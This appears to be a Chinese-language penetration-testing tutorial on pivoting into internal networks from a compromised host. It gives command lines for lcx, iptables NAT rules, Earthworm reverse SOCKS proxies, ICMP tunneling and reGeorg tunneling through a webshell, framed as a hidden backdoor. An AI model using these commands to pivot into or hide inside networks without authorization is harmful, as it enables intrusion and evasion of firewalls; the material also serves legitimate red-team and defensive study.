** 内网穿透 **

* * *

**场景**  

想从外网渗透内网主机，但内网很多主机不直接连外网，所以要进行搭建代理

（前提是已经控制了一台主机，想通过这主机渗透其他内网主机）

win端口转发：lcx.exe netsh

linux端口转发：portmap iptables

多平台：Earthworm

ICMP协议：icmptunnel

端口复用：reGeorg

  
  
** 转发工具 **

* * *

**lcx.exe**

win平台的一款老工具。

(好用是好用，就是被放进全家桶了）

*   
*   
*   

```
//端口转发（listen和slave）lcx.exe -listen 8080 8081 //监听两个端口lcx.exe -slave 192.168.1.128 8080 192.168.1.131 8888 //连接128:8080端口时映射到131:8888端口
```

*   
*   

```
//端口映射（tran）lcx -tran 8888 127.0.0.1 3306 //把8088端口映射到3306端口
```

**iptables**

linux的端口转发工具

开启内核转发

*   
*   

```
echo 1 > /proc/sys/net/ipv4/ip_forwardsysctl -p
```

配置端口转发

*   
*   
*   
*   
*   

```
//正向代理//访问192.168.1.131:8888跳转到192.168.1.128:80iptables -t nat -A PREROUTING --dst 192.168.1.131 -p tcp --dport 8888 -j DNAT --to-destination 192.168.1.128:80iptables -t nat -A POSTROUTING --dst 192.168.1.128 -p tcp --dport 80 -j SNAT --to-source 192.168.1.131service iptables save && service iptables start //保存重启
```

*   
*   

```
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 8888 -j DNAT --to-destination 192.168.1.128:80iptables -t nat -A POSTROUTING -s 192.168.0.0/16 -d 192.168.1.128 -p tcp -m tcp --dport 80 -j SNAT --to-source 192.168.1.131
```

*   
*   
*   

```
//本机之间端口转发iptables -t nat -A PREROUTING -p tcp --dport 8888 -j REDIRECT --to-ports 3389service iptables save && service iptables start //保存重启
```

  

**Earthworm**

代理和端口转发一身的多平台工具（win,linux,mac之间来回穿透）

*   
*   

```
//正向连接ew_win32.exe -s ssocksd -l 8082 //直接变成socks5代理服务器
```

*   
*   
*   

```
//反向连接ew_win32.exe -s rcsocks -l 8081 -e 8082 //监听本机8082端口，等待内网主机连接，访问本机8081就能链接内网ew_win32.exe -s rssocks -d 192.168.1.1 -e 8082 //内网主机转发到外网8082端口
```

  

  

**ICMP协议穿透**

* * *

**icmptunnel**  

  

一款基于icmp协议的linux工具

只能linux与linux之间穿透

(用icmp协议可以穿透防火墙的限制）

https://github.com/jamesbarlow/icmptunnel.git

  

*   
*   
*   

```
//安装git clone https://github.com/jamesbarlow/icmptunnel.git   //下载工具make   //进入目录然后编译
```

禁用自带的icmp，服务端和客户端都要禁用

*   
*   
*   

```
//两种方式，选择其一sysctl -w net.ipv4.icmp_echo_ignore_all=1  echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
```

攻击者打开监听

*   
*   
*   

```
//服务端./icmptunnel -s  &  //服务器端进行监听/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0  //给接口分配一个ip
```

宿主机进行连接  

*   
*   
*   

```
//客户端./icmptunnel 192.168.1.1 &  //连接监听主机/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0  //  分配ip地址
```

然后两主机就在tun0分配的ip地址之间互相通信。  

  

  

  

  ** 端口复用 **

* * *

**介绍**

一个端口运行多个应用  

(适用于服务器只开放了80端口，就凑合一下一起从80端口进出数据）

(有很好的隐藏后门,不用再开通个端口）

  

**reGeorg**

Python2.7写的一款工具，结合Webshell从80端口进行传输。 

支持多种语言

https://github.com/sensepost/reGeorg

*   
*   

```
python2 reGeorgSocksProxy.py -l <监听地址> -p <本地服务监听的端口> -u <Webshell地址>python2 reGeorgSocksProxy.py -l 192.168.1.1 -p 9999 -u http://192.168.1.128/tunnel.nosocket.php
```

然后连接9999端口即可。
